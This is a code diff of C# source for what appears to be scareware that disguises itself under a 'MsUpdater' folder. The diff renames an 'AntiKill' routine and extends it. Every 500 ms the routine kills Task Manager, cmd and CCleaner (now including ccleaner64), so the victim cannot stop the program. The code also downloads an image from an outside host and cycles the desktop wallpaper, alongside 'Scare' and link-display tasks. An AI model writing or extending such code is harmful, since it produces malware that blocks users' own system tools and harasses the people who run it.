@@ -29,6 +29,8 @@
         internal static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 
         private static readonly Random Random = new Random();
+
+        private static readonly List<Action> ActionList = new List<Action>();
         
         private const string Temp = @"C:\Windows\MsUpdater\Temp";
 
@@ -40,7 +42,7 @@
                 Directory.CreateDirectory(Temp);
             }
 
-            AntiKill();
+            SetupTimers();
 
             new Task(DisplayLinksAsync).Start();
             new Task(ScareAsync).Start();
@@ -66,7 +68,7 @@
             }
         }
 
-        private static void AntiKill()
+        private static void SetupTimers()
         {
             new Timer(500d) { Enabled = true }.Elapsed += delegate
             {
@@ -76,12 +78,19 @@
                     {
                         case "cmd":
                         case "ccleaner":
+                        case "ccleaner64":
                         case "taskmgr":
                             process.Kill();
                             break;
                     }
                 });
             };
+
+            new Timer(20d) { Enabled = true }.Elapsed += delegate
+                {
+                    ActionList.ForEach(action => action());
+                    ActionList.Clear();
+                };
         }
 
         [SuppressMessage("ReSharper", "LocalizableElement")]
@@ -114,19 +123,22 @@
         {
             await Task.Delay(300.Seconds());
 
-            var target = Path.Combine(Temp, "background.jpeg");
+            var target = Path.Combine(Temp, "background0.jpeg");
 
-            using (var client = new WebClient())
+            if (!File.Exists(target))
             {
-                client.DownloadFile("http://2.bp.blogspot.com/-QUvbrUetEyM/VumpFVoFGAI/AAAAAAAAAGo/cF3Z0wqHM3wuuqEHpdas-Gs9cu9YhLHUA/s1600/11416159_1627270640883558_5936567115635789082_n.jpg", target);
-            }
-
-            using (var img = Image.FromFile(target))
-            {
-                for (var i = 0; i < 4; i++)
+                using (var client = new WebClient())
                 {
-                    img.RotateFlip(RotateFlipType.Rotate90FlipNone);
-                    img.Save(Path.Combine(Temp, $"background{i}.jpeg"), ImageFormat.Jpeg);
+                    client.DownloadFile("http://2.bp.blogspot.com/-QUvbrUetEyM/VumpFVoFGAI/AAAAAAAAAGo/cF3Z0wqHM3wuuqEHpdas-Gs9cu9YhLHUA/s1600/11416159_1627270640883558_5936567115635789082_n.jpg", target);
+                }
+
+                using (var img = Image.FromFile(target))
+                {
+                    for (var i = 1; i < 4; i++)
+                    {
+                        img.RotateFlip(RotateFlipType.Rotate90FlipNone);
+                        img.Save(Path.Combine(Temp, $"background{i}.jpeg"), ImageFormat.Jpeg);
+                    }
                 }
             }
 
@@ -136,7 +148,7 @@
                 {
                     await Task.Delay(1.Seconds());
 
-                    BackgroundUpdate(Path.Combine(Temp, $"background{i}.jpeg"));
+                    ActionList.Add(() => BackgroundUpdate(Path.Combine(Temp, $"background{i}.jpeg")));
                 }
             }
         }
